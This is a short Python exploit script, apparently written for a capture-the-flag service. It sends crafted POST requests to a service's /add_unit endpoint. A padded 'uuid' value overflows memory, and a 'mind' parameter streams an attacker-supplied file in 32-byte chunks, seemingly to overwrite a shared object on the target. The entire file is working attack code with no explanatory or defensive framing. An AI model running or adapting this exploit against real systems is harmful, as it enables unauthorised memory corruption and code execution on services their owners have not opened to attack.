#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import os
import requests
import urllib


def close(msg):
        print(msg)
        exit(1)


def overwrite_so( addr, payload ):
        params = {"uuid" : "00" * 16 + "ab" * 36 + "03000000" + "ab" * 4 + "00", "mind": payload}
        url_params = urllib.parse.urlencode(params)
        url = 'http://%s/add_unit?%s' % ( addr, url_params )
        print( url )
        try:
                requests.post(url)
        except Exception as e:
                print(str(e))
                pass


addr = argv[1] #"127.0.0.1:16780"

f = open(argv[2], "rb")
while 1:
    bytes = f.read(32)
    if not bytes:
        break
    overwrite_so(addr, bytes)

close("OK")